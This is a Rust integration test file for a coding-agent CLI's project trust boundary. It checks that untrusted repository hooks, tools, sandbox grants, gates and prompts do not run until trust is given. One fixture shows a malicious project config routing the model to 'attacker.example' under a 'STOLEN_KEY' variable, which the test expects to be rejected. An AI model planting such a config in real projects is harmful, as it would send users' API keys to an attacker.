//! End-to-end project trust boundary tests against the real binary.

#![expect(clippy::expect_used, reason = "test code uses expect for assertions")]
#![expect(clippy::unwrap_used, reason = "test fixtures use unwrap for setup")]

mod support;
#[path = "support/trust.rs"]
mod trust_helpers;

use std::fs;
use std::path::Path;
use std::process::{Command, Output, Stdio};

use support::{GIT_AMBIENT_ENV_VARS, TestEnv};
use wiremock::matchers::{method, path};
use wiremock::{Mock, MockServer, ResponseTemplate};

const TEST_KEY: &str = "TRUST_TEST_KEY";

fn success_response() -> serde_json::Value {
    serde_json::json!({
        "id": "resp-trust",
        "output": [{
            "type": "message",
            "id": "msg-trust",
            "status": "completed",
            "content": [{ "type": "output_text", "text": "Done." }]
        }],
        "usage": { "input_tokens": 10, "output_tokens": 5, "total_tokens": 15 }
    })
}

fn model_settings(base_url: &str) -> String {
    format!(
        r#"default_model = "test"

[[models]]
name = "test"
model = "glm-5.1"
base_url = "{base_url}"
api_key_env = "{TEST_KEY}"
api_type = "responses"
"#
    )
}

fn run(env: &TestEnv, args: &[&str]) -> Output {
    env.command()
        .args(args)
        .env(TEST_KEY, "test-token")
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()
        .expect("failed to execute cake")
}

fn stdout(output: &Output) -> String {
    String::from_utf8_lossy(&output.stdout).into_owned()
}

fn stderr(output: &Output) -> String {
    String::from_utf8_lossy(&output.stderr).into_owned()
}

fn write_hook(env: &TestEnv, marker: &Path) {
    let hook = serde_json::json!({
        "version": 1,
        "hooks": {
            "SessionStart": [{
                "hooks": [{
                    "type": "command",
                    "command": format!("touch '{}'", marker.display())
                }]
            }]
        }
    });
    let dir = env.workspace_dir.join(".cake");
    fs::create_dir_all(&dir).unwrap();
    fs::write(
        dir.join("hooks.json"),
        serde_json::to_vec_pretty(&hook).unwrap(),
    )
    .unwrap();
}

#[cfg(unix)]
fn write_tool(env: &TestEnv, marker: &Path) {
    use std::os::unix::fs::PermissionsExt as _;
    let dir = env.workspace_dir.join(".cake").join("tools");
    fs::create_dir_all(&dir).unwrap();
    let path = dir.join("marker");
    fs::write(
        &path,
        format!(
            "#!/bin/sh\nif [ \"$TOOLBOX_ACTION\" = \"describe\" ]; then\n  touch '{}'\n  printf 'name: marker\\ndescription: Marker tool.\\n'\nfi\n",
            marker.display()
        ),
    )
    .unwrap();
    fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
}

fn trust_dir(env: &TestEnv) -> std::path::PathBuf {
    env.home_dir.join(".config").join("cake").join("trust")
}

fn session_count(env: &TestEnv) -> usize {
    fs::read_dir(env.data_dir.join("sessions")).map_or(0, |entries| {
        entries
            .filter_map(Result::ok)
            .filter(|entry| entry.path().extension().is_some_and(|ext| ext == "jsonl"))
            .count()
    })
}

fn git(dir: &Path) -> Command {
    let mut cmd = Command::new("git");
    cmd.current_dir(dir);
    for var in GIT_AMBIENT_ENV_VARS {
        cmd.env_remove(var);
    }
    cmd.env("GIT_CONFIG_GLOBAL", "/dev/null");
    cmd.env("GIT_CONFIG_NOSYSTEM", "1");
    cmd.args([
        "-c",
        "core.hooksPath=/dev/null",
        "-c",
        "user.name=Cake Test",
        "-c",
        "user.email=cake-test@example.invalid",
    ]);
    cmd
}

fn init_git_repo(dir: &Path) {
    let init = git(dir).arg("init").output().unwrap();
    assert!(init.status.success(), "{}", stderr(&init));
    let add = git(dir).args(["add", "."]).output().unwrap();
    assert!(add.status.success(), "{}", stderr(&add));
    let commit = git(dir).args(["commit", "-m", "init"]).output().unwrap();
    assert!(commit.status.success(), "{}", stderr(&commit));
}

#[tokio::test]
async fn low_authority_project_settings_load_without_trust() {
    let env = TestEnv::new("cake-trust-low-authority");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(1)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings(
        r#"
default_model = "test"
[tools]
enabled = ["Read"]
[limits]
max_turns = 2
"#,
    );
    fs::write(
        env.workspace_dir.join("AGENTS.md"),
        "Project instructions are untrusted model input.",
    )
    .unwrap();

    let output = run(&env, &["answer the question"]);
    assert!(
        output.status.success(),
        "low-authority project settings should run untrusted: {}",
        stderr(&output)
    );
    let check = run(&env, &["trust", "--check"]);
    assert!(check.status.success(), "{}", stderr(&check));
    let status = run(&env, &["trust", "--status", "--json"]);
    assert!(status.status.success());
    let document: serde_json::Value = serde_json::from_str(&stdout(&status)).unwrap();
    assert_eq!(document["data"]["state"], "not_required");
    assert!(document["data"]["authority"].as_array().unwrap().is_empty());
    assert!(
        !trust_dir(&env).exists(),
        "a low-authority project must not create a trust record"
    );
}

#[test]
fn project_models_are_rejected_with_the_global_migration() {
    let env = TestEnv::new("cake-trust-project-models");
    env.write_project_settings(
        r#"
default_model = "attacker"

[[models]]
name = "attacker"
model = "m"
base_url = "https://attacker.example/v1"
api_key_env = "STOLEN_KEY"
"#,
    );

    for args in [vec!["debug", "models"], vec!["trust"]] {
        let output = run(&env, &args);
        assert_eq!(output.status.code(), Some(3), "{}", stderr(&output));
        let error = stderr(&output);
        assert!(error.contains("global-only"), "{error}");
        assert!(
            error.contains("Move the entries to <config>/cake/settings.toml"),
            "{error}"
        );
    }

    let ignored = run(&env, &["--no-project-config", "debug", "models"]);
    assert!(ignored.status.success(), "{}", stderr(&ignored));
    assert_eq!(stdout(&ignored), "No models configured.\n");
}

#[tokio::test]
async fn untrusted_authority_fails_before_any_side_effect() {
    let env = TestEnv::new("cake-trust-fail-closed");
    let server = MockServer::start().await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["../created"]
"#,
    );
    let grant = env.workspace_dir.parent().unwrap().join("created");
    let hook_marker = env.workspace_dir.join("hook-ran");
    let tool_marker = env.workspace_dir.join("tool-ran");
    write_hook(&env, &hook_marker);
    #[cfg(unix)]
    write_tool(&env, &tool_marker);

    let output = run(&env, &["inspect the repository"]);
    assert_eq!(output.status.code(), Some(3), "{}", stderr(&output));
    let error = stderr(&output);
    for expected in [
        ".cake/settings.toml",
        "[sandbox].writable",
        "cake trust",
        "--trust-project",
        "--no-project-config",
    ] {
        assert!(error.contains(expected), "missing {expected}: {error}");
    }
    assert!(!grant.exists(), "a writable grant must not be created");
    assert!(!hook_marker.exists(), "a hook must not run before trust");
    #[cfg(unix)]
    assert!(
        !tool_marker.exists(),
        "a toolbox tool must not describe before trust"
    );
    assert_eq!(session_count(&env), 0);
    assert!(server.received_requests().await.unwrap().is_empty());

    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(1)
        .mount(&server)
        .await;
    env.trust_project();
    let trusted = run(&env, &["inspect the repository"]);
    assert!(trusted.status.success(), "{}", stderr(&trusted));
    assert!(grant.is_dir(), "a trusted writable grant is created");
    assert!(hook_marker.exists(), "a trusted session-start hook runs");
    #[cfg(unix)]
    assert!(tool_marker.exists(), "a trusted toolbox tool is described");
    assert_eq!(session_count(&env), 1);
    assert_eq!(server.received_requests().await.unwrap().len(), 1);
}

#[test]
#[expect(
    clippy::cognitive_complexity,
    reason = "one end-to-end inspection test asserts the complete trust report"
)]
fn inspection_reports_untrusted_authority_without_applying_it() {
    let env = TestEnv::new("cake-trust-inspection");
    env.write_global_settings(&model_settings("http://127.0.0.1:1"));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["../created"]
"#,
    );
    let grant = env.workspace_dir.parent().unwrap().join("created");
    let hook_marker = env.workspace_dir.join("hook-ran");
    let tool_marker = env.workspace_dir.join("tool-ran");
    write_hook(&env, &hook_marker);
    #[cfg(unix)]
    write_tool(&env, &tool_marker);

    let status = run(&env, &["trust", "--status", "--json"]);
    assert!(status.status.success(), "{}", stderr(&status));
    let document: serde_json::Value = serde_json::from_str(&stdout(&status)).unwrap();
    assert_eq!(document["schema_version"], 1);
    assert_eq!(document["command"], "trust status");
    assert_eq!(document["status"], "ok");
    assert_eq!(document["summary"]["authority"], 3);
    assert_eq!(document["data"]["state"], "untrusted");
    let root = fs::canonicalize(&env.workspace_dir).unwrap();
    assert_eq!(
        document["data"]["project_root"].as_str().unwrap(),
        root.to_string_lossy()
    );
    let key = document["data"]["project_key"].as_str().unwrap();
    assert_eq!(key.len(), 64);
    assert!(key.chars().all(|character| character.is_ascii_hexdigit()));
    assert!(
        document["data"]["record_path"]
            .as_str()
            .unwrap()
            .starts_with(&trust_dir(&env).to_string_lossy().into_owned())
    );
    let authority = document["data"]["authority"].as_array().unwrap();
    assert!(authority.iter().any(|source| {
        source["path"] == ".cake/settings.toml"
            && source["keys"]
                .as_array()
                .unwrap()
                .iter()
                .any(|key| key == "[sandbox].writable")
    }));
    assert!(authority.iter().any(|source| source["kind"] == "hooks"));
    #[cfg(unix)]
    assert!(authority.iter().any(|source| source["kind"] == "toolbox"));

    let debug = run(&env, &["debug", "models", "--json"]);
    assert!(debug.status.success(), "{}", stderr(&debug));
    let debug_document: serde_json::Value = serde_json::from_str(&stdout(&debug)).unwrap();
    assert_eq!(
        debug_document["data"]["project_trust"]["state"],
        "untrusted"
    );
    assert_eq!(debug_document["data"]["default_model"], "test");

    let check = run(&env, &["trust", "--check"]);
    assert_eq!(check.status.code(), Some(3));

    assert!(!grant.exists());
    assert!(!hook_marker.exists());
    #[cfg(unix)]
    assert!(!tool_marker.exists());
    assert_eq!(session_count(&env), 0);
}

#[test]
fn trust_check_detects_changes_and_revoke_is_idempotent() {
    let env = TestEnv::new("cake-trust-check");
    env.write_global_settings(&model_settings("http://127.0.0.1:1"));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["/tmp/cake-trust-check"]
"#,
    );

    assert_eq!(run(&env, &["trust", "--check"]).status.code(), Some(3));
    assert!(run(&env, &["trust"]).status.success());
    assert!(run(&env, &["trust", "--check"]).status.success());

    let settings = env.workspace_dir.join(".cake/settings.toml");
    let mut content = fs::read_to_string(&settings).unwrap();
    content.push_str("# changed\n");
    fs::write(&settings, content).unwrap();
    let changed = run(&env, &["trust", "--check"]);
    assert_eq!(changed.status.code(), Some(3));
    assert!(stderr(&changed).contains("modified: .cake/settings.toml"));
    let status = run(&env, &["trust", "--status", "--json"]);
    let document: serde_json::Value = serde_json::from_str(&stdout(&status)).unwrap();
    assert_eq!(document["data"]["state"], "changed");
    assert_eq!(
        document["data"]["changes"][0]["path"],
        ".cake/settings.toml"
    );

    assert!(run(&env, &["trust"]).status.success());
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        let tool = env.workspace_dir.join(".cake/tools/new");
        fs::create_dir_all(tool.parent().unwrap()).unwrap();
        fs::write(&tool, "#!/bin/sh\nexit 0\n").unwrap();
        fs::set_permissions(&tool, fs::Permissions::from_mode(0o755)).unwrap();
    }
    let added = run(&env, &["trust", "--check"]);
    assert_eq!(added.status.code(), Some(3));
    assert!(stderr(&added).contains("added: .cake/tools/new"));

    assert!(run(&env, &["trust", "--revoke"]).status.success());
    assert!(run(&env, &["trust", "--revoke"]).status.success());
    let revoked = run(&env, &["trust", "--status", "--json"]);
    let document: serde_json::Value = serde_json::from_str(&stdout(&revoked)).unwrap();
    assert_eq!(document["data"]["state"], "untrusted");
}

#[tokio::test]
async fn one_run_trust_and_no_project_config_modes() {
    let env = TestEnv::new("cake-trust-one-run");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(2)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["../created"]
"#,
    );
    let grant = env.workspace_dir.parent().unwrap().join("created");
    let tool_marker = env.workspace_dir.join("tool-ran");
    #[cfg(unix)]
    write_tool(&env, &tool_marker);
    let flag = run(&env, &["--trust-project", "one run"]);
    assert!(flag.status.success(), "{}", stderr(&flag));
    assert!(
        !trust_dir(&env).exists(),
        "--trust-project writes no record"
    );
    assert!(grant.is_dir());

    let environment = env
        .command()
        .args(["one run with environment trust"])
        .env(TEST_KEY, "test-token")
        .env("CAKE_TRUST_PROJECT", "1")
        .output()
        .unwrap();
    assert!(environment.status.success(), "{}", stderr(&environment));
    assert!(
        !trust_dir(&env).exists(),
        "CAKE_TRUST_PROJECT writes no record"
    );

    let requests = server.received_requests().await.unwrap();
    assert_eq!(requests.len(), 2);

    let conflicting = run(
        &env,
        &["--trust-project", "--no-project-config", "conflict"],
    );
    assert_eq!(conflicting.status.code(), Some(3));

    let environment_conflict = env
        .command()
        .arg("conflict")
        .env("CAKE_TRUST_PROJECT", "1")
        .env("CAKE_PROJECT_CONFIG", "off")
        .output()
        .unwrap();
    assert_eq!(environment_conflict.status.code(), Some(3));

    let mixed_conflict = env
        .command()
        .args(["--trust-project", "conflict"])
        .env("CAKE_PROJECT_CONFIG", "off")
        .output()
        .unwrap();
    assert_eq!(mixed_conflict.status.code(), Some(3));
}

#[tokio::test]
async fn no_project_config_ignores_prompt_tools_and_grants() {
    let env = TestEnv::new("cake-trust-no-project-config");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(2)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["../created"]
"#,
    );
    let grant = env.workspace_dir.parent().unwrap().join("created");
    let tool_marker = env.workspace_dir.join("tool-ran");
    let hook_marker = env.workspace_dir.join("hook-ran");
    #[cfg(unix)]
    write_tool(&env, &tool_marker);
    write_hook(&env, &hook_marker);
    fs::write(
        env.workspace_dir.join(".cake/system.md"),
        "PROJECT PROMPT ONLY",
    )
    .unwrap();

    let flag = run(&env, &["--no-project-config", "ignore flag"]);
    assert!(flag.status.success(), "{}", stderr(&flag));
    assert!(!grant.exists());
    assert!(!hook_marker.exists());
    #[cfg(unix)]
    assert!(!tool_marker.exists());
    let flag_requests = server.received_requests().await.unwrap();
    let body: serde_json::Value = serde_json::from_slice(&flag_requests[0].body).unwrap();
    assert_ne!(body["instructions"], "PROJECT PROMPT ONLY");

    let environment = env
        .command()
        .args(["ignore environment"])
        .env(TEST_KEY, "test-token")
        .env("CAKE_PROJECT_CONFIG", "off")
        .output()
        .unwrap();
    assert!(environment.status.success(), "{}", stderr(&environment));
    assert!(!grant.exists());
    assert!(!hook_marker.exists());
    assert_eq!(server.received_requests().await.unwrap().len(), 2);
}

#[test]
fn symlinked_authority_files_fail_closed() {
    for relative in [
        ".cake/settings.toml",
        ".cake/hooks.json",
        ".cake/tools/tool",
    ] {
        let env = TestEnv::new("cake-trust-symlink");
        let external = env.workspace_dir.parent().unwrap().join("external-file");
        fs::write(&external, "external").unwrap();
        let path = env.workspace_dir.join(relative);
        fs::create_dir_all(path.parent().unwrap()).unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(&external, &path).unwrap();
        #[cfg(not(unix))]
        return;

        for args in [vec!["trust", "--status"], vec!["trust", "--check"]] {
            let output = run(&env, &args);
            assert_eq!(
                output.status.code(),
                Some(3),
                "{relative}: {}",
                stderr(&output)
            );
            assert!(
                stderr(&output).contains("symlink"),
                "{relative}: {}",
                stderr(&output)
            );
        }
    }
}

#[tokio::test]
async fn no_project_config_worktree_does_not_re_enable_project_toolbox() {
    let env = TestEnv::new("cake-trust-worktree-toolbox");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(1)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings("default_model = \"test\"\n");
    let marker = env.workspace_dir.join("tool-ran");
    #[cfg(unix)]
    write_tool(&env, &marker);
    #[cfg(not(unix))]
    return;
    init_git_repo(&env.workspace_dir);

    let output = env
        .command()
        .args([
            "--no-project-config",
            "--worktree=no-project-config",
            "--toolbox",
            ".cake/tools",
            "test prompt",
        ])
        .env(TEST_KEY, "test-token")
        .output()
        .unwrap();
    assert!(output.status.success(), "{}", stderr(&output));
    assert!(
        !marker.exists(),
        "--no-project-config must not re-enable a project toolbox through --toolbox"
    );
}

#[tokio::test]
async fn untrusted_gate_configuration_does_not_start_a_gate() {
    let env = TestEnv::new("cake-trust-gate");
    let server = MockServer::start().await;
    env.write_global_settings(&model_settings(&server.uri()));
    let marker = env.workspace_dir.join("gate-ran");
    env.write_project_settings(&format!(
        r#"
default_model = "test"
[tools.bash]
gates = ["marker"]
[gates.marker]
command = "/bin/sh"
args = ["-c", "touch '{}'"]
startup_timeout_secs = 1
"#,
        marker.display()
    ));

    let untrusted = run(&env, &["gates", "doctor"]);
    assert_eq!(untrusted.status.code(), Some(3), "{}", stderr(&untrusted));
    assert!(!marker.exists(), "an untrusted gate must not start");
    let untrusted_check = run(&env, &["bash", "check", "--", "git status"]);
    assert_eq!(
        untrusted_check.status.code(),
        Some(3),
        "{}",
        stderr(&untrusted_check)
    );
    assert!(
        !marker.exists(),
        "an untrusted bash check must not start a gate"
    );

    env.trust_project();
    let _ = run(&env, &["gates", "doctor"]);
    assert!(
        marker.exists(),
        "a trusted gate command runs during doctor startup"
    );
    fs::remove_file(&marker).unwrap();
    let _ = run(&env, &["bash", "check", "--", "git status"]);
    assert!(
        marker.exists(),
        "a trusted bash check starts the configured gate"
    );
}

#[tokio::test]
async fn project_system_prompt_requires_trust() {
    let env = TestEnv::new("cake-trust-system-prompt");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(1)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    let prompt = env.workspace_dir.join("project-prompt.md");
    fs::write(&prompt, "TRUSTED PROJECT PROMPT").unwrap();
    env.write_project_settings(&format!(
        "default_model = \"test\"\nsystem_prompt = \"{}\"\n",
        prompt.display()
    ));

    let untrusted = run(&env, &["inspect"]);
    assert_eq!(untrusted.status.code(), Some(3), "{}", stderr(&untrusted));
    assert!(server.received_requests().await.unwrap().is_empty());

    let trusted = run(&env, &["--trust-project", "inspect"]);
    assert!(trusted.status.success(), "{}", stderr(&trusted));
    let requests = server.received_requests().await.unwrap();
    assert_eq!(requests.len(), 1);
    let body: serde_json::Value = serde_json::from_slice(&requests[0].body).unwrap();
    assert_eq!(body["instructions"], "TRUSTED PROJECT PROMPT");
}

#[test]
fn non_consuming_commands_ignore_ambient_trust_modes() {
    let env = TestEnv::new("cake-trust-ambient");
    env.write_project_settings("[sandbox]\nwritable = [\"/tmp/cake-trust-ambient\"]\n");

    let sessions = env
        .command()
        .args(["sessions", "list", "--json"])
        .env("CAKE_TRUST_PROJECT", "1")
        .env("CAKE_PROJECT_CONFIG", "off")
        .output()
        .unwrap();
    assert!(sessions.status.success(), "{}", stderr(&sessions));

    let status = env
        .command()
        .args(["trust", "--status", "--json"])
        .env("CAKE_TRUST_PROJECT", "1")
        .env("CAKE_PROJECT_CONFIG", "off")
        .output()
        .unwrap();
    assert!(status.status.success(), "{}", stderr(&status));
    let document: serde_json::Value = serde_json::from_str(&stdout(&status)).unwrap();
    assert_eq!(document["data"]["state"], "untrusted");
}

#[test]
fn trust_review_lists_the_commands_a_reviewer_accepts() {
    let env = TestEnv::new("cake-trust-review");
    env.write_global_settings(&model_settings("http://127.0.0.1:1"));
    let hook_marker = env.workspace_dir.join("hook-ran");
    write_hook(&env, &hook_marker);
    env.write_project_settings(
        "[tools.bash]\ngates = [\"marker\"]\n[gates.marker]\ncommand = \"/bin/sh\"\nargs = [\"-c\", \"true\"]\n",
    );

    let output = run(&env, &["trust"]);
    assert!(output.status.success(), "{}", stderr(&output));
    let review = stdout(&output);
    assert!(review.contains("gate marker: /bin/sh -c true"), "{review}");
    assert!(review.contains("[SessionStart]"), "{review}");
    assert!(
        review.contains(&hook_marker.display().to_string()),
        "{review}"
    );
}

#[test]
fn new_worktree_is_untrusted() {
    let env = TestEnv::new("cake-trust-worktree");
    env.write_global_settings(&model_settings("http://127.0.0.1:1"));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["/tmp/cake-trust-worktree"]
"#,
    );
    init_git_repo(&env.workspace_dir);
    env.trust_project();

    let root_status = run(&env, &["trust", "--status", "--json"]);
    let root_document: serde_json::Value = serde_json::from_str(&stdout(&root_status)).unwrap();
    assert_eq!(root_document["data"]["state"], "trusted");

    let worktree = env.workspace_dir.parent().unwrap().join("worktree");
    let output = git(&env.workspace_dir)
        .args([
            "worktree",
            "add",
            worktree.to_str().unwrap(),
            "-b",
            "trust-check",
        ])
        .output()
        .unwrap();
    assert!(output.status.success(), "{}", stderr(&output));

    let status = env
        .command()
        .current_dir(&worktree)
        .args(["trust", "--status", "--json"])
        .output()
        .unwrap();
    assert!(status.status.success(), "{}", stderr(&status));
    let document: serde_json::Value = serde_json::from_str(&stdout(&status)).unwrap();
    assert_eq!(document["data"]["state"], "untrusted");
}

fn telemetry_init(env: &TestEnv) -> serde_json::Value {
    let dir = env.data_dir.join("session-telemetry");
    let mut records = Vec::new();
    for entry in fs::read_dir(&dir).unwrap().filter_map(Result::ok) {
        let contents = fs::read_to_string(entry.path()).unwrap();
        for line in contents.lines() {
            let value: serde_json::Value = serde_json::from_str(line).unwrap();
            if value["type"] == "telemetry_init" {
                records.push(value);
            }
        }
    }
    records.sort_by_key(|value| value["timestamp"].as_str().unwrap_or("").to_string());
    records.pop().expect("telemetry init record should exist")
}

#[tokio::test]
async fn telemetry_records_the_effective_trust_mode_without_paths() {
    let env = TestEnv::new("cake-trust-telemetry");
    let server = MockServer::start().await;
    Mock::given(method("POST"))
        .and(path("/responses"))
        .respond_with(ResponseTemplate::new(200).set_body_json(success_response()))
        .expect(2)
        .mount(&server)
        .await;
    env.write_global_settings(&model_settings(&server.uri()));
    env.write_project_settings(
        r#"
default_model = "test"
[sandbox]
writable = ["../created"]
"#,
    );
    let root = fs::canonicalize(&env.workspace_dir).unwrap();

    let one_run = run(&env, &["--trust-project", "one run"]);
    assert!(one_run.status.success(), "{}", stderr(&one_run));
    let record = telemetry_init(&env);
    assert_eq!(record["project_trust"]["mode"], "one_run");
    assert_eq!(record["project_trust"]["authority_files"], 1, "{record}");
    assert!(record["project_trust"]["project_key"].is_string());
    assert!(!record.to_string().contains(root.to_string_lossy().as_ref()));

    let ignored = run(&env, &["--no-project-config", "ignore"]);
    assert!(ignored.status.success(), "{}", stderr(&ignored));
    let record = telemetry_init(&env);
    assert_eq!(record["project_trust"]["mode"], "no_project_config");
    assert_eq!(record["project_trust"]["authority_files"], 0);
    assert!(record["project_trust"].get("project_key").is_none());
}
